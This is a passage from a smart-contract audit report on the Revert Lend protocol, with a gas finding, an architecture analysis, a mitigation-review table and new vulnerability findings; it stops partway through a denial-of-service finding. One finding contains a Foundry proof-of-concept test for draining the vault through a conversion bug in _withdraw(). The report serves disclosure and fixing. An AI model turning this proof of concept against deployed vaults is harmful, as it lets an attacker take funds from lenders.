No need to cache nonfungiblePositionManager.ownerOf(tokenId) in stack variable owner since this is used only once in the function.

File : automators/AutoExit.sol


219:  address owner = nonfungiblePositionManager.ownerOf(tokenId);

220:     if (owner != msg.sender) {

221:        revert Unauthorized();

222:     }
AutoExit.sol#L219-L222

Recommended Mitigation Steps
File : automators/AutoExit.sol


-219:  address owner = nonfungiblePositionManager.ownerOf(tokenId);

-220:     if (owner != msg.sender) {

+220:     if (nonfungiblePositionManager.ownerOf(tokenId) != msg.sender) {

221:        revert Unauthorized();

222:     }
kalinbas (Revert) confirmed

Audit Analysis
For this audit, 8 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The report highlighted below by 14si2o_Flint received the top score from the judge.

The following wardens also submitted reports: yongskiws, invitedtea, popeye, Sathish9098, hunter_w3b, K42, and Bauchibred.

Description of Revert Lend
Revert has been developing analytical tools and dashboards to simplify and facility interaction with AMM protocols since June 2022. It is their stated belief that AMM protocols will play a pivotal role in the financial crypto markets in the coming years and they wish to help retails invests interact with these complex and sometimes obtuse protocols. These tools are mainly focused on Uniswap v3.

Revert Lend is their newest initiative, an ERC4626 lending protocol that takes a unique approach by allowing the Uniswap v3 NFT position to be used as collateral to facilitate the acquisition of ERC20 token loans, while allowing the users to retain control and management of their capital within Uniswap v3 Pools. As a consequence, it becomes possible to unify all the liquidity provided from all accepted tokens into one pool.

Another rare aspect of the protocol is the variable interest rate, which is completely dependent on the ebb and flow of the market.

Approach taken for this audit
Time spent on this audit: 11 days
Day 1: 7h 35 mins

Reading the whitepaper and documentation.
Studying Uniswap V3, ERC4626.
Researching hacks of similar protocols.
Creating giant checklist of possible issues.
Day 2-3: 13h 37 mins

First pass through the code, adding questions to note.md while I read.
Creating hand-drawn functional diagrams of all functions available to normal users in Excalidraw.
Day 4-6 : 17h 50mins

Second Pass through the code.
Day 7-8: 11h 06 mins

Go through notes one-by-one answering all questions and adding to preliminary findings.
Finalising preliminary findings.
Trying to test as many as I can in Foundry.
Day 9-11: 20h 55mins

Writing reports & analysis.
Architecture
Note: to view the provided image, please see the original submission here.

In order to properly understand the architecture of the protocol, it is necessary to understand its history.

Revert started back in June of 2022 with a mission of building actionable analytics for liquidity providers in AMM protocols, with a focus on Uniswap. To this end, they developed the initiator and over time they added new functionalities and products such as V3Utils, Auto-Compound, Auto-Exist, Leverage-Transformer and Auto-Range. Revert Lend is their newest product which aims to introduce an ERC4626 vault.

As such, the architecture should not be seen as a master drawing of “the Architect”, but as many layers of architectural drawings, each becoming more complex and integrating what came before. As ingenious as it may be, the more custom functionality that has to be developed to allow everything to fit together, the higher the chances of something being overlooked and exploited.

Architectural Risks
This becomes apparent when we evaluate how the V3Vault interacts with the automated contracts through transform().

For AutoCompound and AutoRange:

User calls executeWithVault from the transformer.
This calls Ivault(vault).transform().
The vault calls back execute() to the transformer.
For AutoExit,FlashloanLiquidator,LeverageTransformer and V3Utils:

User calls transform() from the vault.
I couldn’t find an explanation anywhere in the documentation for having 2 different patterns. In itself this is not a security risk, but the chance of their being an oversight and a risk today or in future incarnations of the protocol, increases exponentially with each additional pattern.

Another issue is the multiplication of similar functionalities across the different contracts. When we look at Uniswap decreaseLiquidity, we can see that every contract besides FlashloanLiquidator can call this on a position. Again, in itself not a security risk, but the effort required to make sure that all instances are correctly configured and there exists no difference that be exploited, increases exponentially with each added similar functionality.

Recommendations
Streamline and perhaps externalise (ITransform) the access pattern between the vault and transformers so that there is only one correct way in which the communication between the two can happen.
Re-factor some of the existing contracts to reduce multiplication of similar functionality.
Main contracts and functionality
For each contract we will give a short description, an overview of the most important functions available to users and a custom function diagram to visualise internal and external calls. Furthermore, any findings will be mentioned with the relevant function.

Note: to view the provided image, please see the original submission here.

V3Vault.sol
An IERC4626 compliant contract that manages one ERC20 asset for lending and borrowing. It accepts Uniswap v3 positions as collateral where these positions are composed of any 2 tokens which each have been configured to have a collateralFactor > 0.

External view functions:

Note: to view the provided images, please see the original submission here.

vaultInfo()

This functions retrieves the global information about the vault.
It makes use of the following internal functions:
_calculateGlobalInterest()
_getAvailableBalance()
_convertToAssets() x2
lendInfo():

Here the lending information for a specified account is retrieved.
It makes use of the following internal functions:
_calculateGlobalInterest()
_convertToAssets()
When we compare vaultInfo and lendInfo, we can see that the rounding for calculating the lending information is different. Due to this, the total lent from vaultInfo will be greater then the sum of lendInfo from all accounts. This could be considered a breaking of a fundamental invariant.
loanInfo():

The tokenId, which is the corresponding Uniswap V3 position, is used as input to retrieve the details of a loan.
It makes use of the following internal functions:
_calculateGlobalInterest()
_convertToAssets()
_checkLoanIsHealthy()
_calculateLiquidation()
When we look at the NatSpec and the naming of the function, it would seem obvious that you will receive the information for one specific loan. The code however, tells a different story. It calculate the debt as the sum of ALL loans taken against a position and calculate the health threshold on this global figure. This will gives users a completely erroneous understanding of their situation.
IERC4626 overridden external view functions:

Note: to view the provided image, please see the original submission here.

totalAssets()

Note that totalAssets makes use of balanceOf(address(this)), which opens an important attack vector of inflation attacks as detailed in finding H- Inflation attack due to the absence of dead shares and the reliance on balanceOf.
convertToShares()

It makes use of the following internal functions:
_calculateGlobalInterest()
_convertToShares()
convertToAssets()

It makes use of the following internal functions:
_calculateGlobalInterest()
_convertToAssets()
maxDeposit()

It makes use of the following internal functions:
_calculateGlobalInterest()
_convertToAssets()
maxMint()

It makes use of the following internal functions:
_calculateGlobalInterest()
_convertToShares()
maxWithdraw()

It makes use of the following internal functions:
_calculateGlobalInterest()
_convertToAssets()
maxRedeem()

balanceOf(owner)
previewDeposit()

It makes use of the following internal functions:
_calculateGlobalInterest()
_convertToShares()
previewMint()

It makes use of the following internal functions:
_calculateGlobalInterest()
_convertToAssets()
previewWithdraw()

It makes use of the following internal functions:
_calculateGlobalInterest()
_convertToShares()
previewRedeel()

It makes use of the following internal functions:
_calculateGlobalInterest()
_convertToShares()
IERC4626 overridden external functions:

Note: to view the provided images, please see the original submission here.

deposit(assets, receiver)

It makes use of the following internal functions:
_deposit()
mint(shares, receiver)

It makes use of the following internal functions:
_deposit()
deposit(shares, receiver, permitData)

It makes use of the following internal functions:
_deposit()
mint(shares, receiver, permitData)

It makes use of the following internal functions:
_deposit()
withdraw(assets, receiver, owner)

It makes use of the following internal functions:
_withdraw()
redeem(shares, receiver, owner)

It makes use of the following internal functions:
_withdraw()
Note that withdraw and redeem are the only functions to not have a permit2 version. Even though the use-case is rare, for completeness those version should be added.

External functions:

Note: to view the provided images, please see the original submission here.

create()

The Uniswap V3 NFT position is transferred to the Vault contract and ownership is set to msg.sender or recipient if he is defined through onERC721Received.
Note that the onERC721Received is inconsistent with the EIP721 standard.
createWithPermit()

The permit version of the abovementioned create() function.
Ownership of position is transferred to the Vault contract and set to msg.sender or recipient if he is defined through onERC721Received.
approveTransform()

A user can approve automated agents (transformers/automators) which will allow them to call the transform function.
transform()

This function is the entry point for all the automated tools developed by the Revert protocol. Users approve these tools through approveTransform, which allows them to call transform to perform any user actions in an automated fashion.
It makes use of the following internal functions:
_updateGlobalInterest()
_convertToAssets()
_requireLoanIsHealthy()
Note that the code comments for “Unauthorized” checks are incorrect.

borrow()

A pivotal function in any lending protocol, the borrow functions allow a user to borrow assets with the uniswap position as collateral.
It makes use of the following internal functions:
_updateGlobalInterest()
_resetDailyDebtIncreaseLimit()
_convertToShares()
_updateAndCheckCollateral()
_convertToAssets()
decreaseLiquidityAndCollect

A user can decrease the liquidity of a given position and resultant assets and potential fees.
It is of remark that transformers are not allowed to use this function since they can call the methods directly on the nonFungiblePositionManager.
It makes use of the following internal functions:
_updateGlobalInterest()
_convertToAssets()
_requireLoanIsHealthy()
repay(tokenId, amount, IsShare)

Used to repay borrowed tokens. Can be denominated in assets or shares.
It makes use of the following internal functions:
_repay()
repay(tokenId, amount, IsShare, permitData)

The permit version of repay.
Used to repay borrowed tokens. Can be denominated in assets or shares.
It makes use of the following internal functions:
_repay()
liquidate()

This function is used to liquidate unhealthy loans.
Transformers cannot call this function directly.
It makes use of the following internal functions:
_updateGlobalInterest()
_convertToAssets()
_checkLoanIsHealthy()
_calculateLiquidation()
_handleReserveLiquidation()
_sendPositionValue()
_cleanupLoan()
Note that the liquidate function has a major flaw in that it only transfers fees from the owner to the liquidator and not decreased liquidity. This causes the liquidator to not obtain the liquidity he paid for and the owner receives part of the liquidity he should have lost.
Also note that the decreaseLiquidity call is performed with 100% slippage tolerance, which can cause the liquidity returned to be close to zero.
V3Oracle.sol
This is contract is in V3Vault to calculate the value of positions. It is the main vector of obtaining price data and uses both Chainlink as well as Uniswap v3 TWAP. Furthermore, it also provides emergency fallback mode.

Note: to view the provided images, please see the original submission here.

getValue

The function obtains value and prices of a Uniswap v3 LP Position in specified token. It uses the configured oracles and verifies price on a second oracle. This the main function used by V3Vault functions to obtain price data.
It makes use of the following functions:

getPositionBreakDown()
_getReferenceTokenPriceX96()
_checkPoolPrice()
Note that a minor issue exists in _requireMaxDifference, which is called by _checkPoolPrice, as detailed in finding [L-05] Limit set to low in _requireMaxDifference.

getPositionBreakDown

It returns a breakdown of a Uniswap v3 position (tokens and fee tier, liquidity, current liquidity amounts, uncollected fees).
It makes use of the following internal functions:

_initializeState()
_getAmounts()
V3Utils.sol
Stateless contract with utility functions for Uniswap V3 positions.

executeWithPermit

This function calls execute with EIP712 permit.
It makes use of the following functions:

execute()
Note: to view the provided images, please see the original submission here.

execute

This functions executes the provided instructions by pulling approved NFT instead of direct safeTransferFrom.
It can make use of the following internal functions:

_decreaseLiquidity()
_collectFees()
_swapAndIncrease()
_swapAndMint()
_routerSwap()
_transferToken()
swap

This function swaps amountIn for tokenOut - returning at least minAmountOut.
It makes use of the following internal functions:

_prepareAddPermit2()
_prepareAddApproved()
_routerSwap()
_transferToken()
swapAndMint

This function performs 1 or 2 swaps from swapSourceToken to token0 and token1 and adds as much as possible liquidity to a newly minted position.
It makes use of the following internal functions:

_prepareAddPermit2()
_prepareAddApproved()
_swapAndMint()
swapAndIncreaseLiquidity

This function performs 1 or 2 swaps from swapSourceToken to token0 and token1 and adds as much as possible liquidity to any existing position.
It makes use of the following internal functions:

_prepareAddPermit2()
_prepareAddApproved()
_swapAndincrease()
AutoExit.sol
This automator contract allows a v3 position to be automatically removed (limit order) or to be swapped to the opposite token (stop loss order) when it reaches a certain tick. The execution of the optimized swap is delegated to a revert controlled bot (operator) using an externalswap router.

Note: to view the provided image, please see the original submission here.

execute

This can only be from a configured operator account. Furthermore, the swap need to be executed within the maximum price difference allowed from the current pool price.
It makes use of the following internal functions:

_getPool()
_decreaseFullLiquidityAndCollect()
_validateSwap()
_routerSwap()
_transferToken()
FlashloanLiquidator.sol
A helper contract which allows atomic liquidation and needed swaps by using Uniswap v3 Flashloan.

Note: to view the provided image, please see the original submission here.

liquidate

This function liquidates a loan from the V3Vault.
It makes use of the following functions:

flashLoanPool.flash()
This causes uniswapV3FlashCallback() to be invoked.
LeverageTransformer.sol
This contract offers functionality to leverage or deleverage Uniswap v3 positions in one transaction.

Note: to view the provided images, please see the original submission here.

leverageUp

The liquidity of a Uniswap v3 position is increased by this function.
It can only be called through the transform function in V3Vault.sol.
It makes use of the following functions:

IVault(msg.sender).borrow()
_routerSwap()
leverageDown

The liquidity of a Uniswap v3 position is decreased by this function.
It can only be called through the transform function in V3Vault.sol.
It makes use of the following functions:

_routerSwap()
IVault(msg.sender).repay()
AutoCompound.sol
This contract allows an approved operator of AutoCompound to compound a position. When called from outside the vault, the positions need to be approved, when called inside, the owner needs to approve the position to be transformed by the contract.

Note: to view the provided images, please see the original submission here.

executeWithVault

The token position in the vault is adjusted through the transform function. It can only be called from the configured operator account or from the vault.
It makes use of the following function:

IVault(vault).transform()
execute

This adjusts the token directly and only be called from the configured operator account or by the vault through transform.
It makes use of the following internal functions:

_getPool()
_hasMaxTWAPTickDifference()
_poolSwap()
_checkApprovals()
_setBalance()
_increaseBalance()
AutoRange.sol
This contract allows an approved operator of AutoRange to change the range for the configured position. If called inside Vault, it will use the transform method. If outside, the positions need to be approved for the contract and configures with configToken function.

Note: to view the provided images, please see the original submission here.

executeWithVault

The token position in the vault is adjusted through the transform function. It can only be called from the configured operator account or from the vault.
It makes use of the following function:

IVault(vault).transform()
execute

This adjusts the token directly and only be called from the configured operator account or by the vault through transform.
It makes use of the following internal functions:

_decreaseFullLiquidityAndCollect()
_getPool()
_getTickSpacing()
_routerSwap()
_transferToken()
Codebase Quality
As a whole, I evaluate the quality of Revert Lend codebase to be “Good”. The contract and function design are clearly well thought out, access control is properly implemented and the various standards are well implemented. Some improvements on attention on detail would be advisable and there are architectural complexities. Details are explained below:

Codebase Quality Categories	Comments
Architecture	Each of the separate products of Revert is well designed, segregating functionality into distinct contracts (e.g., automators, interfaces, transformers, utils) for clarity and ease of maintenance. Further separating the interest model from the vault indicates a clear intention for separation of concerns. When we take entire complex puzzle of all the products together, there are certain concerns as explained above in the Architecture part.
Upgradeability	In the whitepaper (page 5), it is stated: Revert Lend implements a nonupgradable contract design. This decision ensures the integrity of the protocol, minimizing the risk of introducing errors or modifying security trade-offs, through any future modifications. This represents, in my humble opinion, a grave error in judgment. The primary reason why most, if not all, major protocols implement some form of upgradeability, is that bugs and errors are almost assured to happen no matter the quality of the codebase. Regardless of the number of audits, there cannot be a guarantee that a bug will not be found. If the bug stops users from obtaining their funds or allow malicious users to steal with impunity, the protocol team is powerless to act without some form of control. I would strongly recommend the team to implement upgradeability which can easily be burned after a certain amount of time has passed and the risk of problems becomes minute.
Code Comments	The contracts are accompanied by comprehensive comments, facilitating an understanding of the functional logic and critical operations within the code. Functions are described purposefully, and complex sections are elucidated with comments to guide readers through the logic. However, there are several instances where comments remain when the code logic has changed. The protocol could benefit from a spring cleaning excercise where the code comments are all reviewed.
Testing	The protocol has an excellent level of test coverage, approaching nearly 100%. This ensures that a wide array of functionalities and edge cases are tested, contributing to the reliability and security of the code. However, to further enhance the testing framework, the incorporation of fuzz testing and invariant testing is recommended.
Security Practices	The contracts demonstrate awareness of common security pitfalls in Solidity development. Functions are guarded with appropriate access control modifiers (e.g., onlyOwner,emergencyAdmin, transformer mode checks), and state-changing functions are protected against reentrancy attacks. One area of concern is the intention of the protocol to implement transient storage for the transformedTokenId variable, which guards against reentrancy, once the Dencun upgrade goes live. Transient storage is extremely new and there have already been realistic formulations of reentrancy attacks through the use transient storage. As such, I would recommend much caution in implementing these transient variables and/or request an additional audit to explore these specific security issues.
Error Handling	The custom errors are defined in IErrors and correctly applied throughout the codebase. However, in some cases it would have useful to implement the errors with a more expansive message.
Documentation	The sole documentation for the V3Vault is the whitepaper, which is excellently written. Nevertheless, more documentation describing the protocol would be very useful.
Centralization Risks
The protocol defines 2 privileged roles: Owner and EmergencyAdmin.

The Owner is set to a Multisig and Timelock according to the audit README and has the following rights:

In V3Oracle:

setTokenConfig
setEmergencyAdmin
setMaxPoolPriceDifference
In V3Vault:

withdrawReserves
setTransformer
setLimits
setReserveFactor
setReserveProtectionFactor
setTokenConfig
setEmergencyAdmin
In AutoCompound:

setReward
The main issue with the owner design is that all changes are One-Step operations. Regardless whether it is changing the owner itself or setting a token configuration, even the tiniest mistake could cause major damage to the protocol. Either by setting the owner to a random address or wrongly setting twap seconds or a token address, which would give hackers an immediate and easy attack vector to drain the protocol, a single mistake is devastating.

I would recommend the implementation of a two-step approval process for the most critical of operations. Also, the audit README states that the owner is a multisig subject to a Timelock, but nothing of the sorts can be seen in the contract code.

The EmergencyAdmin is set to a Multisig according to the audit README and has the following rights:

In V3Oracle:

setOracleMode
In V3Vault:

setLimits
The emergencyAdmin can essentially pause the protocol by setting the limits to 0 and it can change the oracle from TWAP to Chainlink or change the verification mode. However, if issues are found that are not affected by these limits (liquidation, transformer misbehaving), then the emergencyAdmin does not have the powers to take action.

Instead of a custom role, I would recommend to implement the standardised pattern of pause/unpause, and adding the whenNotPaused modifier to all functions which change state in the protocol. Thus allowing the admin to freeze the entire protocol in case of emergency.

Systemic & Integration Risks
Reliance on double Oracle
The protocols obtain the price information from either Chainlink or Uniswap TWAP and uses the other to verify the price against manipulation. In itself an excellent design but it does mean that the oracle will malfunction if either of the oracle sources malfunctions. This has happened before and even though it is certainly not a reason to not use double verification, it is a risk that should be acknowledged.

Note that proper configuration is also of paramount importance, since the current code will malfunction due to the absence of a L2 sequencer check when deploying on Arbitrum.

Off-chain Router
Many of the transformers make use of an off-chain router to execute swaps. The router is outside the scope of the audit and we cannot evaluate its design or assess its security. As such, if the router were to go off-line or be compromised, the entire protocol will be compromised.

Integrating ERC4626 Vault with Transformers
Transformers are treated as trusted actors and can effect state-changing calls on the Vault. In itself, this is not a problem. However, as noted above in the architectural risks part, the multiplication of similar functionality exponentially increases the risk of a security oversight.

Furthermore, the current design allows future transformers, which might have security issues or unforeseen side-effects when interacting with the vault, to be quickly added as a trusted source.

Lack of Upgradeability
The absence of any upgradeability leaves the protocol powerless when critical bugs and errors are found. While it is true that upgrades can also introducing security issues (Euler hack is a famous example), bugs are as certain as death & taxes, so functionality to resolve these should be implemented.

I would recommend implementing the UUPS proxy pattern since this allows the protocol to resolve bugs and burn the upgradeability once the protocol has been live for a significant amount of time and the likelihood of new bugs becomes minute.

Transient Storage
The protocol intents (code comment) to use transient storage for the transformedTokenId variable, which is critical for guarding against reentrancy. This could a problem since it is a new and fairly unexplored functionality. Since some theoretical reentrancy attacks are already being discussed, I would suggest much prudence in implementing this.

Time spent
71 hours

kalinbas (Revert) acknowledged

Mitigation Review
Introduction
Following the C4 audit, 3 wardens (b0g0, ktg and thank_you) reviewed the mitigations for all identified issues. Additional details can be found within the C4 Revert Lend Mitigation Review repository.

Mitigation Review Scope
URL	Mitigation of	Purpose
https://github.com/revert-finance/lend/pull/19	H-01	Checks token in permit
https://github.com/revert-finance/lend/pull/8 https://github.com/revert-finance/lend/pull/32	H-02	Removed sending of NFT to avoid reentrancy
https://github.com/revert-finance/lend/pull/29	H-03	Refactoring to make all transformers properly check caller permission
https://github.com/revert-finance/lend/pull/29	H-04	Refactoring to make all transformers properly check caller permission
https://github.com/revert-finance/lend/pull/10	H-05	Fixed calculation
https://github.com/revert-finance/lend/pull/8 https://github.com/revert-finance/lend/pull/32	H-06	Removed sending of NFT to avoid reentrancy
https://github.com/revert-finance/lend/pull/23	M-05	Fixed
https://github.com/revert-finance/lend/pull/22	M-06	Fixed
https://github.com/revert-finance/lend/pull/21	M-07	Fixed
https://github.com/revert-finance/lend/pull/11	M-08	Fixed
https://github.com/revert-finance/lend/pull/20	M-09	Fixed
https://github.com/revert-finance/lend/pull/18	M-10	Fixed
https://github.com/revert-finance/lend/pull/17	M-11	Added safety buffer for borrow and decreaseLiquidity (not for transformers)
https://github.com/revert-finance/lend/pull/16	M-12	Fixed
https://github.com/revert-finance/lend/pull/15	M-14	Fixed
https://github.com/revert-finance/lend/pull/8 https://github.com/revert-finance/lend/pull/32	M-15	Fixed
https://github.com/revert-finance/lend/pull/14 https://github.com/revert-finance/lend/pull/30	M-16	Fixed
https://github.com/revert-finance/lend/pull/12	M-18	Fixed
https://github.com/revert-finance/lend/pull/26	M-19	Fixed
https://github.com/revert-finance/lend/pull/25	M-20	Fixed
https://github.com/revert-finance/lend/pull/24	M-21	Added deadline where missing
https://github.com/revert-finance/lend/pull/11	M-22	Fixed
https://github.com/revert-finance/lend/pull/7	M-24	Fixed calculation
https://github.com/revert-finance/lend/pull/5	M-25	Fixed calculation
Additional Scope to be reviewed
URL	Mitigation of	Purpose
https://github.com/revert-finance/lend/pull/13	Original QA Issue #220	Improper return of chainlinkReferencePriceX96
https://github.com/revert-finance/lend/pull/27	Medium Bot-Report Issue #12	Missing L2 sequencer checks for Chainlink oracle
https://github.com/revert-finance/lend/pull/28	Medium Bot-Report Issue #14	Some ERC20 can revert on a zero value transfer
https://github.com/revert-finance/lend/pull/31	N/A - QA, GAS	Several small changes to address QA and GAS optimization issues.
https://github.com/revert-finance/lend/pull/33	N/A - QA, GAS	Several small changes to address QA and GAS optimization issues.
https://github.com/revert-finance/lend/pull/34	N/A - QA, GAS	Several small changes to address QA and GAS optimization issues.
Out of Scope
Issue	Comments
M-01	Acknowledged, see comments in original Issue #466.
M-02	Acknowledged, this is solved off-chain by the operator bots, see discussion in original Issue #459.
M-03	Acknowledged, at deployment a resonable value will be set for minLoanSize.
M-04	Acknowledged, we will monitor for this behaviour and adjust config if needed, see discussion in original Issue #435.
M-13	Acknowledged, see comment in original Issue #256.
M-17	Acknowledged, see comment in original Issue #216.
M-23	Acknowledged, this is solved off-chain by the operator bots.
Mitigation Review Summary
The wardens confirmed the mitigations for all in-scope findings except for M-12 (Unmitigated) and Medium Bot-Report Issue #12 (Medium severity mitigation error). They also surfaced several new issues: 1 High severity and 3 Medium severity.

Original Issue	Status	Full Details
H-01	🟢 Mitigation Confirmed	Reports from thank_you, b0g0 and ktg
H-02	🟢 Mitigation Confirmed	Reports from thank_you, ktg and b0g0
H-03	🟢 Mitigation Confirmed	Reports from ktg, thank_you and b0g0
H-04	🟢 Mitigation Confirmed	Reports from thank_you, ktg and b0g0
H-05	🟢 Mitigation Confirmed	Reports from thank_you, b0g0 and ktg
H-06	🟢 Mitigation Confirmed	Reports from thank_you, ktg and b0g0
M-05	🟢 Mitigation Confirmed	Reports from b0g0, thank_you and ktg
M-06	🟢 Mitigation Confirmed	Reports from thank_you, b0g0 and ktg
M-07	🟢 Mitigation Confirmed	Reports from ktg, thank_you and b0g0
M-08	🟢 Mitigation Confirmed	Reports from thank_you, b0g0 and ktg
M-09	🟢 Mitigation Confirmed	Reports from b0g0, thank_you and ktg
M-10	🟢 Mitigation Confirmed	Reports from thank_you, b0g0 and ktg
M-11	🟢 Mitigation Confirmed	Reports from thank_you and b0g0
M-12	🔴 Unmitigated	Reports from thank_you, b0g0 and ktg
M-14	🟢 Mitigation Confirmed	Report from thank_you
M-15	🟢 Mitigation Confirmed	Reports from thank_you, b0g0 and ktg
M-16	🟢 Mitigation Confirmed	Reports from b0g0, thank_you and ktg
M-18	🟢 Mitigation Confirmed	Reports from b0g0, thank_you and ktg
M-19	🟢 Mitigation Confirmed	Reports from thank_you, b0g0 and ktg
M-20	🟢 Mitigation Confirmed	Reports from b0g0, thank_you and ktg
M-21	🟢 Mitigation Confirmed	Reports from thank_you, b0g0 and ktg
M-22	🟢 Mitigation Confirmed	Reports from thank_you, b0g0 and ktg
M-24	🟢 Mitigation Confirmed	Reports from thank_you, b0g0 and ktg
M-25	🟢 Mitigation Confirmed	Reports from ktg and b0g0
Original QA Issue #220	🟢 Mitigation Confirmed	Reports from b0g0, thank_you and ktg
Medium Bot-Report Issue #12	🔴 Mitigation Error	Reports from ktg, b0g0 and thank_you
Medium Bot-Report Issue #14	🟢 Mitigation Confirmed	Reports from thank_you, b0g0 and ktg
QA/Gas: PR 31	🟢 Mitigation Confirmed	Reports from thank_you, b0g0 and ktg
QA/Gas: PR 33	🟢 Mitigation Confirmed	Reports from thank_you, b0g0 and ktg
QA/Gas: PR 34	🟢 Mitigation Confirmed	Reports from thank_you, b0g0 and ktg
[M-12] Unmitigated
Submitted by thank_you, also found by b0g0 and ktg

Original issue
M-12: Wrong global lending limit check in _deposit function

Comments
Revert utilizes a global lend limit to ensure that lenders do not exceed a global lend limit. Unfortunately, the global lend limit is denominated in assets. The value it compares itself to is totalSupply(), which is denominated in shares. This comparison is invalid since both values are in different denominations.

Lines of code
https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol?plain=1#L961-L963

Vulnerability details
The _deposit() function incorrectly utilizes the wrong denomination when comparing the globalLendLimit to the number of shares. The globalLendLimit denomination is set in assets. However, totalSupply() + shares denomination is set in shares. This makes this comparison check incorrect and can lead to more assets being lent than anticipated.

Impact
More assets may be deposited than expected.

Proof of Concept
Reviewing the function below:

if (totalSupply() + shares > globalLendLimit) {

    revert GlobalLendLimit();

}
Since totalSupply() + shares are denominated as shares and globalLendLimit as assets, the comparison is incorrect.

Recommended Mitigation Steps
Convert the totalSupply() + shares to the correct denomination in assets:

uint256 totalSharesDenominatedInAssets = _convertToAssets(totalSupply() + shares, newLendExchangeRateX96, Math.Rounding.Up);

if (totalSharesDenominatedInAssets > globalLendLimit) {

      revert GlobalLendLimit();

}
Assessed type
Math

[Medium Bot-Report Issue #12] Mitigation Error
Submitted by ktg, also found by b0g0 and thank_you

https://github.com/revert-finance/lend/blob/audit/src/V3Oracle.sol#L360-L362

Original issue
Missing L2 sequencer checks for Chainlink oracle

Impact
Wrong logic in L2 sequencer check:

If sequencerUptimeFeed is set, then the function will revert most of the time and affect a lot of other functions in Revert Lend.

Proof of concept
The original issue is fixed by PR #27. The mitigation code adds sequencer check as follows:

// sequencer check on chains where needed

        if (sequencerUptimeFeed != address(0)) {

            (, int256 sequencerAnswer, uint256 startedAt,,) =

                AggregatorV3Interface(sequencerUptimeFeed).latestRoundData();


            // Answer == 0: Sequencer is up

            // Answer == 1: Sequencer is down

            if (sequencerAnswer == 0) {

                revert SequencerDown();

            }


            // Make sure the grace period has passed after the

            // sequencer is back up.

            uint256 timeSinceUp = block.timestamp - startedAt;

            if (timeSinceUp <= SEQUENCER_GRACE_PERIOD_TIME) {

                revert SequencerGracePeriodNotOver();

            }

        }
However, as you can see in the comment sequencerAnswer == 0 indicates that the sequencer is up, yet in that case the code reverts with SequencerDown error (wrong logic).

This logic is also stated in the docs:

The message calls the updateStatus function in the ArbitrumSequencerUptimeFeed contract and updates the latest sequencer status to 0 if the sequencer is up and 1 if it is down.

Since most of the time the the sequencer is up (sequencerAnswer == 0), the function will revert most of the time and affect many other functions/contracts.

Recommended Mitigation Steps
Change if (sequencerAnswer == 0) to if (sequencerAnswer == 1).

Assessed type
Invalid Validation

kalinbas (Revert) confirmed

Lenders can drain the Vault when withdrawing
Submitted by b0g0

Severity: High

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L1007-L1010

Impact
V3Vault can be drained through the withdraw() function due to improper asset conversion.

Vulnerability
PR-14 introduced a couple of updates to the V3Vault contract in response to this finding in order to prevent liquidations from getting DOSed.

A changes has also been introduced to _withdraw() so that instead of reverting when a lender tries to withdraw more shares than he owns, the amount is automatically reduced to the max withdrawable shares for that lender. This is how the change looks:

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L1007-L1010

 function _withdraw(address receiver, address owner, uint256 amount, bool isShare)

        internal

        returns (uint256 assets, uint256 shares)

    {

        ....


        if (isShare) {

            shares = amount;

            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);

        } else {

            assets = amount;

            shares = _convertToShares(amount, newLendExchangeRateX96, Math.Rounding.Up);

        }


+        uint256 ownerBalance = balanceOf(owner);

+        if (shares > ownerBalance) {

+            shares = ownerBalance;

+            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);

+        }


        ....

    }
The problem is that the newly added code does not use the proper variable to convert the owner shares to assets. If you look closely you will see that _convertToAssets() uses amount instead of shares .

In the case the function is called with isShare == true (e.g redeem()) everything will be ok, since amount == shares. However, if _withdraw() is called with isShare == false (e.g withdraw()) the conversion will be wrong, because amount == assets. This will inflate the assets variable and since there are no checks after that to prevent it, more tokens will be transferred to the owner than he owns.

POC
I’ve coded a short POC in the V3Vault.t.sol test file to demonstrate the vulnerability

Short summary of the POC:

A deposit is created for 10 USDC.
The vault is funded with additional assets.
lastLendExchangeRateX96 is increased by 2% to simulate exchange rate dynamics.
Owner calls withdraw() with an amount that is above the shares he owns so that the check can be activated.
Owner receives the original 10 USDC + 10.3 USDC on top, effectively draining the pool.
using stdStorage for StdStorage;

....

function testWithdrawExploit(uint256 amount) external {

        // 0 borrow loan

        _setupBasicLoan(false);


        // provide additional 1000 USDC to vault

        deal(address(USDC), address(vault), 1000e6);


        uint256 lent = vault.lendInfo(WHALE_ACCOUNT);

        uint256 lentShares = vault.balanceOf(WHALE_ACCOUNT);


        // check max withdraw

        uint256 maxWithdrawal = vault.maxWithdraw(WHALE_ACCOUNT);


        // total available assets in vault is 1e9

        assertEq(vault.totalAssets(), 1e9);


        // lender can withdraw max 1e7 based on his shares

        assertEq(maxWithdrawal, 1e7);


        // balance before transfer

        uint256 balanceBefore = USDC.balanceOf(WHALE_ACCOUNT);


        // simulate lend exchange rate increases by 2%

        stdstore

            .target(address(vault))

            .sig("lastLendExchangeRateX96()")

            .checked_write(Q96 + ((Q96 * 2) / 100));


        vm.prank(WHALE_ACCOUNT);

        // activate  `shares > ownerBalance` check

        // by trying to withdraw more shares than owned

        vault.withdraw(maxWithdrawal * 2, WHALE_ACCOUNT, WHALE_ACCOUNT);


        // balance after transfer

        uint256 balanceAfter = USDC.balanceOf(WHALE_ACCOUNT);


        uint256 withdrawn = balanceAfter - balanceBefore;


        // lender has withdrawn more than he should

        assertGt(withdrawn, maxWithdrawal);


        // for initial deposit of 10 USDC, the lender received 10 USDC extra

        assertEq(withdrawn - maxWithdrawal, 10399999);

    }
Recommended Mitigation
Refactor the newly added check inside _withdraw() to use shares instead of amount:

 uint256 ownerBalance = balanceOf(owner);

        if (shares > ownerBalance) {

            shares = ownerBalance;

-            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);

+            assets = _convertToAssets(shares, newLendExchangeRateX96, Math.Rounding.Down);

        }
Assessed type
Invalid Validation

kalinbas (Revert) confirmed

An attacker can DOS AutoExit and AutoRange transformers and incur losses for position owners
Submitted by b0g0

Severity: Medium

An exploiter can block the execution of AutoExit and AutoRange transformers, which leads to the following consequences:

Limit orders and Stoploss orders - position owners won’t be able to exit a bad market and will suffer losses.
Autorange orders - positions that go out-of-range won’t be rebalanced leading to missed profits or direct losses.
Vulnerability details
The AutoRange.sol and AutoExit.sol contracts serve the following functionality in Revert Lend:

AutoRange.sol contract

